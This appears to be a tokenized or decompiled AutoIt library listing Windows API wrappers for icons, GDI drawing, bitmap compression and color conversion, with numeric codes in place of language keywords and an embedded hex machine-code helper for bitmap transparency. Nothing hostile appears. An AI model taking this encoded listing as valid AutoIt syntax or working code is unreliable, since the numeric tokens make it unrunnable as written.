32_WINAPI_FILEICONINIT($BRESTORE=39)
28$ARET=58("shell32.dll","int",660,"int",$BRESTORE)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
341
33
32_WINAPI_GETICONDIMENSION($HICON)
28$TICONINFO=65($TAGICONINFO)
28$ARET=58("user32.dll","bool","GetIconInfo","handle",$HICON,"struct*",$TICONINFO)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
28$TSIZE=_WINAPI_GETBITMAPDIMENSION(66($TICONINFO,5))
13$I=4155
_WINAPI_DELETEOBJECT(66($TICONINFO,$I))
14
43223($TSIZE)534287(20,0,0)
34$TSIZE
33
32_WINAPI_GETICONINFO($HICON)
28$TINFO=65($TAGICONINFO)
28$ARET=58("user32.dll","bool","GetIconInfo","handle",$HICON,"struct*",$TINFO)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
28$AICON[6]
$AICON[0]=39
$AICON[1]=66($TINFO,"Icon")<>0
$AICON[2]=66($TINFO,"XHotSpot")
$AICON[3]=66($TINFO,"YHotSpot")
$AICON[4]=66($TINFO,"hMask")
$AICON[5]=66($TINFO,"hColor")
34$AICON
33
32_WINAPI_GETICONINFOEX($HICON)
28$TIIEX=65("dword;int;dword;dword;ptr;ptr;ushort;wchar[260];wchar[260]")
69($TIIEX,1,68($TIIEX))
28$ARET=58("user32.dll","bool","GetIconInfoExW","handle",$HICON,"struct*",$TIIEX)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
28$ARESULT[8]
13$I=0157
$ARESULT[$I]=66($TIIEX,$I+2)
14
34$ARESULT
33
32_WINAPI_LOADICON($HINSTANCE,$SNAME)
28$STYPEOFNAME="int"
4233($SNAME)5
$STYPEOFNAME="wstr"
8
28$ARET=58("user32.dll","handle","LoadIconW","handle",$HINSTANCE,$STYPEOFNAME,$SNAME)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_LOADICONMETRIC($HINSTANCE,$SNAME,$IMETRIC)
28$STYPEOFNAME="int"
4233($SNAME)5
$STYPEOFNAME="wstr"
8
28$ARET=58("comctl32.dll","long","LoadIconMetric","handle",$HINSTANCE,$STYPEOFNAME,$SNAME,"int",$IMETRIC,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]534287(10,$ARET[0],0)
34$ARET[4]
33
32_WINAPI_LOADICONWITHSCALEDOWN($HINSTANCE,$SNAME,$IWIDTH,$IHEIGHT)
28$STYPEOFNAME="int"
4233($SNAME)5
$STYPEOFNAME="wstr"
8
28$ARET=58("comctl32.dll","long","LoadIconWithScaleDown","handle",$HINSTANCE,$STYPEOFNAME,$SNAME,"int",$IWIDTH,"int",$IHEIGHT,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]534287(10,$ARET[0],0)
34$ARET[5]
33
32_WINAPI_LOADSHELL32ICON($IICONID)
28$TICONS=65("ptr Data")
28$IICONS=_WINAPI_EXTRACTICONEX("shell32.dll",$IICONID,0,$TICONS,1)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$IICONS<=0534287(10,0,0)
3466($TICONS,"Data")
33
32_WINAPI_LOOKUPICONIDFROMDIRECTORYEX($PDATA,$BICON=39,$IXDESIREDPIXELS=0,$IYDESIREDPIXELS=0,$IFLAGS=0)
28$ARET=58("user32.dll","int","LookupIconIdFromDirectoryEx","ptr",$PDATA,"bool",$BICON,"int",$IXDESIREDPIXELS,"int",$IYDESIREDPIXELS,"uint",$IFLAGS)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_MIRRORICON($HICON,$BDELETE=40)
43$BDELETE5
$HICON=_WINAPI_COPYICON($HICON)
8
28$ARET=58("comctl32.dll","int",414,"ptr",0,"ptr*",$HICON)
4@ERROR23$ARET[0]5
28$IERROR=@ERROR+10
4$HICON13$BDELETE5
_WINAPI_DESTROYICON($HICON)
8
34287($IERROR,0,0)
8
34$ARET[2]
33
32__TRANSPARENCYPROC()
31$PPROC=0
43$PPROC5
4@AUTOITX645
$PPROC=__INIT(13("0x48894C240848895424104C894424184C894C24205541574831C0505050505050"&"4883EC284883BC24800000000074054831C0EB0748C7C0010000004821C07522"&"488BAC248000000048837D180074054831C0EB0748C7C0010000004821C07502"&"EB0948C7C001000000EB034831C04821C0740B4831C04863C0E93C0100004C63"&"7C24784983FF647E0F48C7C0010000004863C0E9220100004C637C24784D21FF"&"7D08C74424780000000048C74424280100000048C74424300000000048C74424"&"3800000000488BAC24800000004C637D04488BAC2480000000486345084C0FAF"&"F849C1E7024983C7FC4C3B7C24380F8C88000000488BAC24800000004C8B7D18"&"4C037C24384983C7034C897C2440488B6C2440480FB64500505888442448807C"&"244800744B4C0FB67C244848634424784C0FAFF84C89F848C7C1640000004899"&"48F7F94989C74C89F850488B6C244858884500488B6C2440807D0000740948C7"&"4424280000000048C7442430010000004883442438040F8149FFFFFF48837C24"&"3000741148837C242800740948C7C001000000EB034831C04821C0740E48C7C0"&"FFFFFFFF4863C0EB11EB0C48C7C0010000004863C0EB034831C04883C458415F"&"5DC3"))
6
$PPROC=__INIT(13("0x555331C05050505050837C242800740431C0EB05B80100000021C075198B6C24"&"28837D1400740431C0EB05B80100000021C07502EB07B801000000EB0231C021"&"C0740731C0E9E50000008B5C242483FB647E0AB801000000E9D20000008B5C24"&"2421DB7D08C744242400000000C7042401000000C744240400000000C7442408"&"000000008B6C24288B5D048B6C24280FAF5D08C1E30283C3FC3B5C24087C648B"&"6C24288B5D14035C240883C303895C240C8B6C240C0FB6450088442410807C24"&"100074380FB65C24100FAF5C242489D8B96400000099F7F989C3538B6C241058"&"8845008B6C240C807D00007407C7042400000000C74424040100000083442408"&"047181837C240400740D833C24007407B801000000EB0231C021C07409B8FFFF"&"FFFFEB0BEB07B801000000EB0231C083C4145B5DC21000"))
8
8
34$PPROC
33
2930$TAGBITMAPV4HEADER="struct;dword bV4Size;long bV4Width;long bV4Height;ushort bV4Planes;ushort bV4BitCount;dword bV4Compression;dword bV4SizeImage;long bV4XPelsPerMeter;long bV4YPelsPerMeter;dword bV4ClrUsed;dword bV4ClrImportant;dword bV4RedMask;dword bV4GreenMask;dword bV4BlueMask;dword bV4AlphaMask;dword bV4CSType;int bV4Endpoints[9];dword bV4GammaRed;dword bV4GammaGreen;dword bV4GammaBlue;endstruct"
2930$TAGCOLORADJUSTMENT="ushort Size;ushort Flags;ushort IlluminantIndex;ushort RedGamma;ushort GreenGamma;ushort BlueGamma;ushort ReferenceBlack;ushort ReferenceWhite;short Contrast;short Brightness;short Colorfulness;short RedGreenTint"
2930$TAGDEVMODE="wchar DeviceName[32];ushort SpecVersion;ushort DriverVersion;ushort Size;ushort DriverExtra;dword Fields;short Orientation;short PaperSize;short PaperLength;short PaperWidth;short Scale;short Copies;short DefaultSource;short PrintQuality;short Color;short Duplex;short YResolution;short TTOption;short Collate;wchar FormName[32];ushort Unused1;dword Unused2[3];dword Nup;dword Unused3;dword ICMMethod;dword ICMIntent;dword MediaType;dword DitherType;dword Reserved1;dword Reserved2;dword PanningWidth;dword PanningHeight"
2930$TAGDEVMODE_DISPLAY="wchar DeviceName[32];ushort SpecVersion;ushort DriverVersion;ushort Size;ushort DriverExtra;dword Fields;"&$TAGPOINT&";dword DisplayOrientation;dword DisplayFixedOutput;short Unused1[5];wchar Unused2[32];ushort LogPixels;dword BitsPerPel;dword PelsWidth;dword PelsHeight;dword DisplayFlags;dword DisplayFrequency"
2930$TAGDWM_COLORIZATION_PARAMETERS="dword Color;dword AfterGlow;uint ColorBalance;uint AfterGlowBalance;uint BlurBalance;uint GlassReflectionIntensity; uint OpaqueBlend"
2930$TAGENHMETAHEADER="struct;dword Type;dword Size;long rcBounds[4];long rcFrame[4];dword Signature;dword Version;dword Bytes;dword Records;ushort Handles;ushort Reserved;dword Description;dword OffDescription;dword PalEntries;long Device[2];long Millimeters[2];dword PixelFormat;dword OffPixelFormat;dword OpenGL;long Micrometers[2];endstruct"
2930$TAGEXTLOGPEN="dword PenStyle;dword Width;uint BrushStyle;dword Color;ulong_ptr Hatch;dword NumEntries"
2930$TAGFONTSIGNATURE="dword fsUsb[4];dword fsCsb[2]"
2930$TAGGLYPHMETRICS="uint BlackBoxX;uint BlackBoxY;"&$TAGPOINT&";short CellIncX;short CellIncY"
2930$TAGLOGBRUSH="uint Style;dword Color;ulong_ptr Hatch"
2930$TAGLOGPEN="uint Style;dword Width;dword Color"
2930$TAGMAT2="short eM11[2];short eM12[2];short eM21[2];short eM22[2]"
2930$TAGNEWTEXTMETRIC=$TAGTEXTMETRIC&";dword ntmFlags;uint ntmSizeEM;uint ntmCellHeight;uint ntmAvgWidth"
2930$TAGNEWTEXTMETRICEX=$TAGNEWTEXTMETRIC&";"&$TAGFONTSIGNATURE
2930$TAGPANOSE="struct;byte bFamilyType;byte bSerifStyle;byte bWeight;byte bProportion;byte bContrast;byte bStrokeVariation;byte bArmStyle;byte bLetterform;byte bMidline;byte bXHeight;endstruct"
2930$TAGOUTLINETEXTMETRIC="struct;uint otmSize;"&$TAGTEXTMETRIC&";byte otmFiller;"&$TAGPANOSE&";byte bugFiller[3];uint otmSelection;uint otmType;int otmCharSlopeRise;int otmCharSlopeRun;int otmItalicAngle;uint otmEMSquare;int otmAscent;int otmDescent;uint otmLineGap;uint otmCapEmHeight;uint otmXHeight;long otmFontBox[4];int otmMacAscent;int otmMacDescent;uint otmMacLineGap;uint otmMinimumPPEM;long otmSubscriptSize[2];long otmSubscriptOffset[2];long otmSuperscriptSize[2];long otmSuperscriptOffse[2];uint otmStrikeoutSize;int otmStrikeoutPosition;int otmUnderscoreSize;int otmUnderscorePosition;uint_ptr otmFamilyName;uint_ptr otmFaceName;uint_ptr otmStyleName;uint_ptr otmFullName;endstruct"
2930$TAGPAINTSTRUCT="hwnd hDC;int fErase;dword rPaint[4];int fRestore;int fIncUpdate;byte rgbReserved[32]"
2930$TAGRGNDATAHEADER="struct;dword Size;dword Type;dword Count;dword RgnSize;"&$TAGRECT&";endstruct"
2930$TAGXFORM="float eM11;float eM12;float eM21;float eM22;float eDx;float eDy"
32_WINAPI_ABORTPATH($HDC)
28$ARET=58("gdi32.dll","bool","AbortPath","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_ADDFONTMEMRESOURCEEX($PDATA,$ISIZE)
28$ARET=58("gdi32.dll","handle","AddFontMemResourceEx","ptr",$PDATA,"dword",$ISIZE,"ptr",0,"dword*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
34288($ARET[4],$ARET[0])
33
32_WINAPI_ADDFONTRESOURCEEX($SFONT,$IFLAG=0,$BNOTIFY=40)
28$ARET=58("gdi32.dll","int","AddFontResourceExW","wstr",$SFONT,"dword",$IFLAG,"ptr",0)
4@ERROR23$ARET[0]534287(@ERROR,@EXTENDED,0)
4$BNOTIFY5
2830$WM_FONTCHANGE=29
2830$HWND_BROADCAST=65535
58("user32.dll","lresult","SendMessage","hwnd",$HWND_BROADCAST,"uint",$WM_FONTCHANGE,"wparam",0,"lparam",0)
8
34$ARET[0]
33
32_WINAPI_ADDICONOVERLAY($HICON,$HOVERLAY)
28$ARET,$HRESULT=0,$IERROR=0
28$AHDEV[2]=[0,0]
28$TSIZE=_WINAPI_GETICONDIMENSION($HICON)
28$HIL=58("comctl32.dll","handle","ImageList_Create","int",66($TSIZE,1),"int",66($TSIZE,2),"uint",33,"int",2,"int",2)
4@ERROR23$HIL[0]534287(@ERROR+10,@EXTENDED,0)
11
$AHDEV[0]=_WINAPI_CREATE32BITHICON($HICON)
4@ERROR5
$IERROR=@ERROR+100
18
8
$ARET=58("comctl32.dll","int","ImageList_ReplaceIcon","handle",$HIL[0],"int",-1,"handle",$AHDEV[0])
4@ERROR2($ARET[0]=-1)5
$IERROR=@ERROR+200
18
8
$AHDEV[1]=_WINAPI_CREATE32BITHICON($HOVERLAY)
4@ERROR5
$IERROR=@ERROR+300
18
8
$ARET=58("comctl32.dll","int","ImageList_ReplaceIcon","handle",$HIL[0],"int",-1,"handle",$AHDEV[1])
4@ERROR2($ARET[0]=-1)5
$IERROR=@ERROR+400
18
8
$ARET=58("comctl32.dll","bool","ImageList_SetOverlayImage","handle",$HIL[0],"int",1,"int",1)
4@ERROR23$ARET[0]5
$IERROR=@ERROR+500
18
8
$ARET=58("comctl32.dll","handle","ImageList_GetIcon","handle",$HIL[0],"int",0,"uint",256)
4@ERROR23$ARET[0]5
$IERROR=@ERROR+600
18
8
$HRESULT=$ARET[0]
121
58("comctl32.dll","bool","ImageList_Destroy","handle",$HIL[0])
13$I=0151
4$AHDEV[$I]5
_WINAPI_DESTROYICON($AHDEV[$I])
8
14
43$HRESULT534287($IERROR,0,0)
34$HRESULT
33
32_WINAPI_ADJUSTBITMAP($HBITMAP,$IWIDTH,$IHEIGHT,$IMODE=3,$TADJUSTMENT=0)
28$TOBJ=65($TAGBITMAP)
28$ARET=58("gdi32.dll","int","GetObject","handle",$HBITMAP,"int",68($TOBJ),"struct*",$TOBJ)
4@ERROR23$ARET[0]534287(@ERROR,@EXTENDED,0)
4$IWIDTH=-15
$IWIDTH=66($TOBJ,"bmWidth")
8
4$IHEIGHT=-15
$IHEIGHT=66($TOBJ,"bmHeight")
8
$ARET=58("user32.dll","handle","GetDC","hwnd",0)
28$HDC=$ARET[0]
$ARET=58("gdi32.dll","handle","CreateCompatibleDC","handle",$HDC)
28$HDESTDC=$ARET[0]
$ARET=58("gdi32.dll","handle","CreateCompatibleBitmap","handle",$HDC,"int",$IWIDTH,"int",$IHEIGHT)
28$HBMP=$ARET[0]
$ARET=58("gdi32.dll","handle","SelectObject","handle",$HDESTDC,"handle",$HBMP)
28$HDESTSV=$ARET[0]
$ARET=58("gdi32.dll","handle","CreateCompatibleDC","handle",$HDC)
28$HSRCDC=$ARET[0]
$ARET=58("gdi32.dll","handle","SelectObject","handle",$HSRCDC,"handle",$HBITMAP)
28$HSRCSV=$ARET[0]
4_WINAPI_SETSTRETCHBLTMODE($HDESTDC,$IMODE)5
23$IMODE
214
4223($TADJUSTMENT)5
43_WINAPI_SETCOLORADJUSTMENT($HDESTDC,$TADJUSTMENT)5
8
8
216
24
8
$ARET=_WINAPI_STRETCHBLT($HDESTDC,0,0,$IWIDTH,$IHEIGHT,$HSRCDC,0,0,66($TOBJ,"bmWidth"),66($TOBJ,"bmHeight"),13369376)
58("user32.dll","int","ReleaseDC","hwnd",0,"handle",$HDC)
58("gdi32.dll","handle","SelectObject","handle",$HDESTDC,"handle",$HDESTSV)
58("gdi32.dll","handle","SelectObject","handle",$HSRCDC,"handle",$HSRCSV)
58("gdi32.dll","bool","DeleteDC","handle",$HDESTDC)
58("gdi32.dll","bool","DeleteDC","handle",$HSRCDC)
43$ARET534287(10,0,0)
34$HBMP
33
32_WINAPI_ALPHABLEND($HDESTDC,$IXDEST,$IYDEST,$IWIDTHDEST,$IHEIGHTDEST,$HSRCDC,$IXSRC,$IYSRC,$IWIDTHSRC,$IHEIGHTSRC,$IALPHA,$BALPHA=40)
28$IBLEND=19(21(3($BALPHA=40),-24),21(17($IALPHA,255),-16))
28$ARET=58("gdi32.dll","bool","GdiAlphaBlend","handle",$HDESTDC,"int",$IXDEST,"int",$IYDEST,"int",$IWIDTHDEST,"int",$IHEIGHTDEST,"handle",$HSRCDC,"int",$IXSRC,"int",$IYSRC,"int",$IWIDTHSRC,"int",$IHEIGHTSRC,"dword",$IBLEND)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_ANGLEARC($HDC,$IX,$IY,$IRADIUS,$NSTARTANGLE,$NSWEEPANGLE)
28$ARET=58("gdi32.dll","bool","AngleArc","handle",$HDC,"int",$IX,"int",$IY,"dword",$IRADIUS,"float",$NSTARTANGLE,"float",$NSWEEPANGLE)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_ARC($HDC,$TRECT,$IXSTARTARC,$IYSTARTARC,$IXENDARC,$IYENDARC)
28$ARET=58("gdi32.dll","bool","Arc","handle",$HDC,"int",66($TRECT,1),"int",66($TRECT,2),"int",66($TRECT,3),"int",66($TRECT,4),"int",$IXSTARTARC,"int",$IYSTARTARC,"int",$IXENDARC,"int",$IYENDARC)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_ARCTO($HDC,$TRECT,$IXRADIAL1,$IYRADIAL1,$IXRADIAL2,$IYRADIAL2)
28$ARET=58("gdi32.dll","bool","ArcTo","handle",$HDC,"int",66($TRECT,1),"int",66($TRECT,2),"int",66($TRECT,3),"int",66($TRECT,4),"int",$IXRADIAL1,"int",$IYRADIAL1,"int",$IXRADIAL2,"int",$IYRADIAL2)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_BEGINPAINT($HWND,36$TPAINTSTRUCT)
$TPAINTSTRUCT=65($TAGPAINTSTRUCT)
28$ARET=58("user32.dll","handle","BeginPaint","hwnd",$HWND,"struct*",$TPAINTSTRUCT)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_BEGINPATH($HDC)
28$ARET=58("gdi32.dll","bool","BeginPath","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_CLOSEENHMETAFILE($HDC)
28$ARET=58("gdi32.dll","handle","CloseEnhMetaFile","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_CLOSEFIGURE($HDC)
28$ARET=58("gdi32.dll","bool","CloseFigure","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_COLORADJUSTLUMA($IRGB,$IPERCENT,$BSCALE=39)
4$IRGB=-1534287(10,0,-1)
4$BSCALE5
$IPERCENT=125($IPERCENT*10)
8
28$ARET=58("shlwapi.dll","dword","ColorAdjustLuma","dword",__RGB($IRGB),"int",$IPERCENT,"bool",$BSCALE)
4@ERROR534287(@ERROR,@EXTENDED,-1)
34__RGB($ARET[0])
33
32_WINAPI_COLORHLSTORGB($IHUE,$ILUMINANCE,$ISATURATION)
43$ISATURATION5$IHUE=160
28$ARET=58("shlwapi.dll","dword","ColorHLSToRGB","word",$IHUE,"word",$ILUMINANCE,"word",$ISATURATION)
4@ERROR534287(@ERROR,@EXTENDED,-1)
34__RGB($ARET[0])
33
32_WINAPI_COLORRGBTOHLS($IRGB,36$IHUE,36$ILUMINANCE,36$ISATURATION)
28$ARET=58("shlwapi.dll","none","ColorRGBToHLS","dword",__RGB($IRGB),"word*",0,"word*",0,"word*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
$IHUE=$ARET[2]
$ILUMINANCE=$ARET[3]
$ISATURATION=$ARET[4]
341
33
32_WINAPI_COMBINETRANSFORM($TXFORM1,$TXFORM2)
28$TXFORM=65($TAGXFORM)
28$ARET=58("gdi32.dll","bool","CombineTransform","struct*",$TXFORM,"struct*",$TXFORM1,"struct*",$TXFORM2)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34$TXFORM
33
32_WINAPI_COMPRESSBITMAPBITS($HBITMAP,36$PBUFFER,$ICOMPRESSION=0,$IQUALITY=100)
43__DLL("gdiplus.dll")534287(103,0,0)
28$ASIZE[2],$ICOUNT,$IFORMAT,$ILENGTH,$SMIME,$ARET,$HDC,$HSV,$HMEM,$TBITS,$TDATA,$PDATA,$IERROR=1
28$HSOURCE=0,$HIMAGE=0,$HTOKEN=0,$PSTREAM=0,$TPARAM=0
28$TDIB=65($TAGDIBSECTION)
11
23$ICOMPRESSION
210
$SMIME="image/png"
211
$SMIME="image/jpeg"
216
$IERROR=10
18
24
9$HBITMAP
43_WINAPI_GETOBJECT($HBITMAP,68($TDIB),$TDIB)5
$IERROR=11
182
8
4(66($TDIB,"bmBitsPixel")=32)1(366($TDIB,"biCompression"))5
$IERROR=12
18
8
4$HSOURCE5
$IERROR=13
182
8
$HSOURCE=_WINAPI_CREATEDIB(66($TDIB,"bmWidth"),66($TDIB,"bmHeight"))
43$HSOURCE5
$IERROR=@ERROR+100
182
8
$HDC=_WINAPI_CREATECOMPATIBLEDC(0)
$HSV=_WINAPI_SELECTOBJECT($HDC,$HSOURCE)
4_WINAPI_DRAWBITMAP($HDC,0,0,$HBITMAP)5
$HBITMAP=$HSOURCE
6
$IERROR=@ERROR+200
$HBITMAP=0
8
_WINAPI_SELECTOBJECT($HDC,$HSV)
_WINAPI_DELETEDC($HDC)
10
43$HBITMAP5
18
8
13$I=0151
$ASIZE[$I]=66($TDIB,$I+2)
14
$TBITS=65("byte["&($ASIZE[0]*$ASIZE[1]*4)&"]")
43_WINAPI_GETBITMAPBITS($HBITMAP,68($TBITS),$TBITS)5
$IERROR=@ERROR+300
18
8
$TDATA=65($TAGGDIPSTARTUPINPUT)
69($TDATA,"Version",1)
$ARET=58("gdiplus.dll","int","GdiplusStartup","ulong_ptr*",0,"struct*",$TDATA,"ptr",0)
4@ERROR2$ARET[0]5
$IERROR=@ERROR+400
18
8
4_WINAPI_ISALPHABITMAP($HBITMAP)5
$IFORMAT=2498570
6
$IFORMAT=139273
8
$HTOKEN=$ARET[1]
$ARET=58("gdiplus.dll","int","GdipCreateBitmapFromScan0","int",$ASIZE[0],"int",$ASIZE[1],"uint",$ASIZE[0]*4,"int",$IFORMAT,"struct*",$TBITS,"ptr*",0)
4@ERROR2$ARET[0]5
$IERROR=@ERROR+500
18
8
$HIMAGE=$ARET[6]
$ARET=58("gdiplus.dll","int","GdipGetImageEncodersSize","uint*",0,"uint*",0)
4@ERROR2$ARET[0]5
$IERROR=@ERROR+600
18
8
$ICOUNT=$ARET[1]
$TDATA=65("byte["&$ARET[2]&"]")
4@ERROR5
$IERROR=@ERROR+700
18
8
$PDATA=67($TDATA)
$ARET=58("gdiplus.dll","int","GdipGetImageEncoders","uint",$ICOUNT,"uint",$ARET[2],"struct*",$TDATA)
4@ERROR2$ARET[0]5
$IERROR=@ERROR+800
18
8
28$TCODEC,$PENCODER=0
13$I=115$ICOUNT
$TCODEC=65($TAGGDIPIMAGECODECINFO,$PDATA)
43311(_WINAPI_WIDECHARTOMULTIBYTE(66($TCODEC,"MimeType")),$SMIME)5
$PDATA+=68($TAGGDIPIMAGECODECINFO)
6
$PENCODER=$PDATA
$IERROR=0
18
8
14
43$PENCODER5
$IERROR=15
18
8
23$ICOMPRESSION
210
211
2830$TAGENCODERPARAMETER="byte[16] GUID;ulong NumberOfValues;dword Type;ptr pValue"
$TPARAM=65("dword Count;"&$TAGENCODERPARAMETER&";ulong Quality")
69($TPARAM,"Count",1)
69($TPARAM,"NumberOfValues",1)
69($TPARAM,"Type",4)
69($TPARAM,"pValue",67($TPARAM,"Quality"))
69($TPARAM,"Quality",$IQUALITY)
$ARET=58("ole32.dll","long","CLSIDFromString","wstr","{1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB}","ptr",67($TPARAM,2))
4@ERROR2$ARET[0]5
$TPARAM=0
8
24
$PSTREAM=_WINAPI_CREATESTREAMONHGLOBAL()
$ARET=58("gdiplus.dll","int","GdipSaveImageToStream","handle",$HIMAGE,"ptr",$PSTREAM,"ptr",$PENCODER,"struct*",$TPARAM)
4@ERROR2$ARET[0]5
$IERROR=@ERROR+900
18
8
$HMEM=_WINAPI_GETHGLOBALFROMSTREAM($PSTREAM)
$ARET=58("kernel32.dll","ulong_ptr","GlobalSize","handle",$HMEM)
4@ERROR23$ARET[0]5
$IERROR=@ERROR+1000
18
8
$ILENGTH=$ARET[0]
$ARET=58("kernel32.dll","ptr","GlobalLock","handle",$HMEM)
4@ERROR23$ARET[0]5
$IERROR=@ERROR+1100
18
8
$PBUFFER=__HEAPREALLOC($PBUFFER,$ILENGTH,1)
43@ERROR5
_WINAPI_MOVEMEMORY($PBUFFER,$ARET[0],$ILENGTH)
6
$IERROR=@ERROR+1300
8
121
4$PSTREAM5
_WINAPI_RELEASESTREAM($PSTREAM)
8
4$HIMAGE5
58("gdiplus.dll","int","GdipDisposeImage","handle",$HIMAGE)
8
4$HTOKEN5
58("gdiplus.dll","none","GdiplusShutdown","ulong_ptr",$HTOKEN)
8
4$HSOURCE5
_WINAPI_DELETEOBJECT($HSOURCE)
8
4$IERROR534287($IERROR,0,0)
34$ILENGTH
33
32_WINAPI_COPYENHMETAFILE($HEMF,$SFILEPATH="")
28$STYPEOFFILE="wstr"
43333($SFILEPATH,$STR_STRIPLEADING+$STR_STRIPTRAILING)5
$STYPEOFFILE="ptr"
$SFILEPATH=0
8
28$ARET=58("gdi32.dll","handle","CopyEnhMetaFileW","handle",$HEMF,$STYPEOFFILE,$SFILEPATH)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_COPYRECT($TRECT)
28$TDATA=65($TAGRECT)
28$ARET=58("user32.dll","bool","CopyRect","struct*",$TDATA,"struct*",$TRECT)
4@ERROR23$ARET[0]5287(@ERROR+10,@EXTENDED,0)
34$TDATA
33
32_WINAPI_CREATE32BITHBITMAP($HICON,$BDIB=40,$BDELETE=40)
28$HBITMAP=0
28$ADIB[2]=[0,0]
28$HTEMP=_WINAPI_CREATE32BITHICON($HICON)
4@ERROR534287(@ERROR,@EXTENDED,0)
28$IERROR=0
11
28$TICONINFO=65($TAGICONINFO)
28$ARET=58("user32.dll","bool","GetIconInfo","handle",$HTEMP,"struct*",$TICONINFO)
4@ERROR23$ARET[0]5
$IERROR=@ERROR+10
18
8
13$I=0151
$ADIB[$I]=66($TICONINFO,$I+4)
14
28$TBITMAP=65($TAGBITMAP)
43_WINAPI_GETOBJECT($ADIB[0],68($TBITMAP),$TBITMAP)5
$IERROR=@ERROR+20
18
8
4$BDIB5
$HBITMAP=_WINAPI_CREATEDIB(66($TBITMAP,"bmWidth"),66($TBITMAP,"bmHeight"))
28$HDC=_WINAPI_CREATECOMPATIBLEDC(0)
28$HSV=_WINAPI_SELECTOBJECT($HDC,$HBITMAP)
_WINAPI_DRAWICONEX($HDC,0,0,$HTEMP)
_WINAPI_SELECTOBJECT($HDC,$HSV)
_WINAPI_DELETEDC($HDC)
6
$HBITMAP=$ADIB[1]
$ADIB[1]=0
8
121
13$I=0151
4$ADIB[$I]5
_WINAPI_DELETEOBJECT($ADIB[$I])
8
14
_WINAPI_DESTROYICON($HTEMP)
4$IERROR534287($IERROR,0,0)
43$HBITMAP534287(12,0,0)
4$BDELETE5
_WINAPI_DESTROYICON($HICON)
8
34$HBITMAP
33
32_WINAPI_CREATEBITMAPINDIRECT(36$TBITMAP)
28$ARET=58("gdi32.dll","handle","CreateBitmapIndirect","struct*",$TBITMAP)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_CREATEBRUSHINDIRECT($ISTYLE,$IRGB,$IHATCH=0)
28$TLOGBRUSH=65($TAGLOGBRUSH)
69($TLOGBRUSH,1,$ISTYLE)
69($TLOGBRUSH,2,__RGB($IRGB))
69($TLOGBRUSH,3,$IHATCH)
28$ARET=58("gdi32.dll","handle","CreateBrushIndirect","struct*",$TLOGBRUSH)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_CREATECOLORADJUSTMENT($IFLAGS=0,$IILLUMINANT=0,$IGAMMAR=10000,$IGAMMAG=10000,$IGAMMAB=10000,$IBLACK=0,$IWHITE=10000,$ICONTRAST=0,$IBRIGHTNESS=0,$ICOLORFULNESS=0,$ITINT=0)
28$TCA=65($TAGCOLORADJUSTMENT)
69($TCA,1,68($TCA))
69($TCA,2,$IFLAGS)
69($TCA,3,$IILLUMINANT)
69($TCA,4,$IGAMMAR)
69($TCA,5,$IGAMMAG)
69($TCA,6,$IGAMMAB)
69($TCA,7,$IBLACK)
69($TCA,8,$IWHITE)
69($TCA,9,$ICONTRAST)
69($TCA,10,$IBRIGHTNESS)
69($TCA,11,$ICOLORFULNESS)
69($TCA,12,$ITINT)
34$TCA
33
32_WINAPI_CREATECOMPATIBLEBITMAPEX($HDC,$IWIDTH,$IHEIGHT,$IRGB)
28$HBRUSH=_WINAPI_CREATEBRUSHINDIRECT(0,$IRGB)
28$ARET=58("gdi32.dll","handle","CreateCompatibleDC","handle",$HDC)
28$HDESTDC=$ARET[0]
$ARET=58("gdi32.dll","handle","CreateCompatibleBitmap","handle",$HDC,"int",$IWIDTH,"int",$IHEIGHT)
28$HBMP=$ARET[0]
$ARET=58("gdi32.dll","handle","SelectObject","handle",$HDESTDC,"handle",$HBMP)
28$HDESTSV=$ARET[0]
28$TRECT=_WINAPI_CREATERECTEX(0,0,$IWIDTH,$IHEIGHT)
28$IERROR=0
$ARET=58("user32.dll","int","FillRect","handle",$HDESTDC,"struct*",$TRECT,"handle",$HBRUSH)
4@ERROR23$ARET[0]5
$IERROR=@ERROR+10
_WINAPI_DELETEOBJECT($HBMP)
8
_WINAPI_DELETEOBJECT($HBRUSH)
58("gdi32.dll","handle","SelectObject","handle",$HDESTDC,"handle",$HDESTSV)
58("gdi32.dll","bool","DeleteDC","handle",$HDESTDC)
4$IERROR534287($IERROR,0,0)
34$HBMP
33
32_WINAPI_CREATEDIBITMAP($HDC,36$TBITMAPINFO,$IUSAGE,$PBITS=0)
28$IINIT=0
4$PBITS5
$IINIT=4
8
28$ARET=58("gdi32.dll","handle","CreateDIBitmap","handle",$HDC,"struct*",$TBITMAPINFO,"dword",$IINIT,"struct*",$PBITS,"struct*",$TBITMAPINFO,"uint",$IUSAGE)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
